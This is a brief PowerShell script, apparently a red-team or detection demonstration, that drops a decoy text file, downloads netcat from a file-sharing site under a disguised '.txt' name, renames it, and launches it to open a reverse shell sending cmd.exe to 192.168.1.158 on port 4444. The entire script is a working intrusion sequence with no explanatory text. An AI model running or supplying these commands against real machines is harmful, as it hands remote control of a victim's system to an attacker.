echo "Securethelogs.com" >> "C:\temp\important_document.txt"
Start-Process powershell.exe "C:\temp\important_document.txt"



(New-Object net.webclient).DownloadFile('https://www.privfile.com/download.php?fid=5ea2e7a741842-NjQ0', 'C:\seclogs\nc.exe.txt')
Rename-Item -Path "C:\seclogs\nc.exe.txt" -NewName "C:\seclogs\nc.exe"

Start-Sleep -Seconds 5
C:\seclogs\nc.exe 192.168.1.158 4444 -e cmd.exe

